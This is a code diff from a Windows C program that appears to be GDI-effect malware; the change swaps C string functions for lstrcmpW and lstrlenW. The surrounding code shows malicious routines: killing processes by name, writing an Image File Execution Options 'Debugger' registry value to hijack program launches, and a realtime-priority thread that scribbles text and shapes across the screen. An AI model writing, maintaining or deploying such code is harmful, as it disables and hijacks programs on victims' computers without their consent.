@@ -39,7 +39,7 @@ DWORD FindProcessID(LPCWSTR lpProcessName)
 	BOOL bSnapProcessRes = Process32FirstW(hProcessSnapshot, &procEntry);
 	while (bSnapProcessRes)
 	{
-		if (!wcscmp(procEntry.szExeFile, lpProcessName))
+		if (!lstrcmpW(procEntry.szExeFile, lpProcessName))
 		{
 			return procEntry.th32ProcessID;
 		}
@@ -75,7 +75,7 @@ void TerminateProcessName(LPCWSTR lpProcessname)
 	BOOL bTerminateProcessRes = Process32FirstW(hProcessSnapshot, &prcs);
 	while (bTerminateProcessRes)
 	{
-		if (!wcscmp(prcs.szExeFile, lpProcessname))
+		if (!lstrcmpW(prcs.szExeFile, lpProcessname))
 		{
 			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, prcs.th32ProcessID);
 			if (hProcess != NULL)
@@ -101,7 +101,7 @@ void SetImageFileExecution(LPCWSTR lpProgramName)
 
 	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
 	{
-		RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (LPBYTE)lpData, (wcslen(lpData) + 1) * sizeof(WCHAR));
+		RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (LPBYTE)lpData, (lstrlenW(lpData) + 1) * sizeof(WCHAR));
 
 	}
 	RegCloseKey(hKey);
@@ -301,10 +301,10 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 		SelectObject(hdc, rainbow);
 		SetTextColor(hdc, clrrainbow);
 		SetBkColor(hdc, RGB(0, 0, 255));
-		TextOutW(hdc, rng() % width, rng() % height, txtmg, wcslen(txtmg));
-		TextOutW(hdc, rng() % width, rng() % height, txtmg, wcslen(txtmg));
-		TextOutW(hdc, rng() % width, rng() % height, txtmg, wcslen(txtmg));
-		TextOutW(hdc, rng() % width, rng() % height, txtmg, wcslen(txtmg));
+		TextOutW(hdc, rng() % width, rng() % height, txtmg, lstrlenW(txtmg));
+		TextOutW(hdc, rng() % width, rng() % height, txtmg, lstrlenW(txtmg));
+		TextOutW(hdc, rng() % width, rng() % height, txtmg, lstrlenW(txtmg));
+		TextOutW(hdc, rng() % width, rng() % height, txtmg, lstrlenW(txtmg));
 		Ellipse(hdc, rng() % width, rng() % height, rng() % width, rng() % height);
 		Rectangle(hdc, rng() % width, rng() % height, rng() % width, rng() % height);
 		RoundRect(hdc, rng() % width, rng() % height, rng() % width, rng() % height, rng() % width, rng() % height);
@@ -483,6 +483,7 @@ int main()
 	HANDLE hmagnetargdipayloads = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)magnetargdipayloads, NULL, NULL, NULL);
 	SetThreadPriority(hmagnetargdipayloads, REALTIME_PRIORITY_CLASS);
 	WaitForSingleObject(hmagnetargdipayloads, INFINITE);
+
         CloseHandle(lppi->hProcess);
         CloseHandle(lppi->hThread);
 	HeapFree(hHeap, NULL, lpsi);
